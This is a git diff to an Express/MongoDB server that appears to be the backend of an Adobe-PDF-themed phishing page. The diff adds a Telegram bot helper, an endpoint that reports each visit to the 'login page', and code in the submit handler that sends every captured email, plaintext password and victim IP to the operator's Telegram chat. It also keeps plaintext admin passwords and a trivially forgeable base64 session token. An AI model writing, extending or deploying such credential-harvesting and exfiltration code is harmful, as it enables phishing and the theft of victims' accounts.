@@ -3,6 +3,7 @@ const express = require('express');
 const cors = require('cors');
 const { MongoClient } = require('mongodb');
 const path = require('path');
+const axios = require('axios');
 
 const app = express();
 
@@ -18,11 +19,37 @@ const DB_NAME = process.env.DB_NAME || 'adobe-pdf-db';
 const USERS_COLLECTION = process.env.USERS_COLLECTION || 'submissions';
 const ADMINS_COLLECTION = process.env.ADMINS_COLLECTION || 'admins';
 
+// Telegram Configuration
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
 let db;
 let usersCollection;
 let adminsCollection;
 
 const client = new MongoClient(MONGO_URI);
+
+// Telegram Helper Function
+async function sendTelegramMessage(message) {
+  try {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.log('⚠️ Telegram credentials not configured');
+      return;
+    }
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    await axios.post(url, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    });
+    
+    console.log('✅ Telegram message sent');
+  } catch (error) {
+    console.error('❌ Telegram error:', error.message);
+  }
+}
 
 // Connect to MongoDB
 async function connectDB() {
@@ -35,19 +62,47 @@ async function connectDB() {
     // Create index for emails
     await usersCollection.createIndex({ email: 1 });
     
-    console.log('\u2705 Connected to MongoDB');
+    console.log('✅ Connected to MongoDB');
   } catch (error) {
-    console.error('\u274c MongoDB Connection Error:', error);
+    console.error('❌ MongoDB Connection Error:', error);
     process.exit(1);
   }
 }
 
 // Routes
 
-// 1. Submit form data (from your frontend)
+// 1. Page Visit Notification
+app.post('/api/page-visit', async (req, res) => {
+  try {
+    const { page } = req.body;
+    const ip = req.ip || req.connection.remoteAddress;
+    const timestamp = new Date().toLocaleString();
+    
+    const message = `
+🔔 <b>Page Visit Notification</b>
+
+📄 <b>Page:</b> ${page || 'Unknown'}
+🌐 <b>IP Address:</b> <code>${ip}</code>
+⏰ <b>Time:</b> ${timestamp}
+
+<i>Someone visited your login page!</i>
+    `.trim();
+    
+    await sendTelegramMessage(message);
+    
+    res.json({ success: true, message: 'Notification sent' });
+  } catch (error) {
+    console.error('Error:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// 2. Submit form data (from your frontend)
 app.post('/api/submit', async (req, res) => {
   try {
     const { email, password } = req.body;
+    const ip = req.ip || req.connection.remoteAddress;
+    const timestamp = new Date();
     
     if (!email || !password) {
       return res.status(400).json({ error: 'Email and password required' });
@@ -57,11 +112,25 @@ app.post('/api/submit', async (req, res) => {
     const result = await usersCollection.insertOne({
       email,
       password,
-      submittedAt: new Date(),
-      ip: req.ip || req.connection.remoteAddress
+      submittedAt: timestamp,
+      ip: ip
     });
     
-    console.log(`\u2705 New submission: ${email}`);
+    console.log(`✅ New submission: ${email}`);
+    
+    // Send Telegram notification
+    const message = `
+🚨 <b>NEW SUBMISSION!</b>
+
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+🌐 <b>IP Address:</b> <code>${ip}</code>
+⏰ <b>Time:</b> ${timestamp.toLocaleString()}
+
+<b>Check your admin dashboard for more details!</b>
+    `.trim();
+    
+    await sendTelegramMessage(message);
     
     res.json({
       success: true,
@@ -74,7 +143,7 @@ app.post('/api/submit', async (req, res) => {
   }
 });
 
-// 2. Admin login
+// 3. Admin login
 app.post('/api/admin/login', async (req, res) => {
   try {
     const { username, password } = req.body;
@@ -83,14 +152,14 @@ app.post('/api/admin/login', async (req, res) => {
       return res.status(400).json({ error: 'Username and password required' });
     }
     
-    // Check credentials (simple version - in production use bcrypt)
+    // Check credentials
     const admin = await adminsCollection.findOne({ username });
     
     if (!admin || admin.password !== password) {
       return res.status(401).json({ error: 'Invalid credentials' });
     }
     
-    // Create session token (simple JWT-like token)
+    // Create session token
     const token = Buffer.from(`${username}:${Date.now()}`).toString('base64');
     
     // Store token in admin collection
@@ -99,7 +168,7 @@ app.post('/api/admin/login', async (req, res) => {
       { $set: { lastLogin: new Date(), sessionToken: token } }
     );
     
-    console.log(`\u2705 Admin logged in: ${username}`);
+    console.log(`✅ Admin logged in: ${username}`);
     
     res.json({
       success: true,
@@ -112,7 +181,7 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// 3. Get all submissions (admin only)
+// 4. Get all submissions (admin only)
 app.get('/api/admin/submissions', async (req, res) => {
   try {
     const token = req.headers.authorization?.split(' ')[1];
@@ -145,7 +214,7 @@ app.get('/api/admin/submissions', async (req, res) => {
   }
 });
 
-// 4. Admin logout
+// 5. Admin logout
 app.post('/api/admin/logout', async (req, res) => {
   try {
     const token = req.headers.authorization?.split(' ')[1];
@@ -163,7 +232,7 @@ app.post('/api/admin/logout', async (req, res) => {
   }
 });
 
-// 5. Serve admin dashboard
+// 6. Serve admin dashboard
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
 });
@@ -177,13 +246,14 @@ const PORT = process.env.PORT || 5000;
 
 connectDB().then(() => {
   app.listen(PORT, () => {
-    console.log(`\ud83d\ude80 Server running on port ${PORT}`);
-    console.log(`\ud83d\udcca Admin dashboard: http://localhost:${PORT}/admin`);
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📊 Admin dashboard: http://localhost:${PORT}/admin`);
+    console.log(`📱 Telegram notifications: ${TELEGRAM_BOT_TOKEN ? '✅ Enabled' : '❌ Disabled'}`);
   });
 });
 
 process.on('SIGINT', async () => {
-  console.log('\n\ud83d\uded1 Shutting down...');
+  console.log('\n🛑 Shutting down...');
   await client.close();
   process.exit(0);
 });
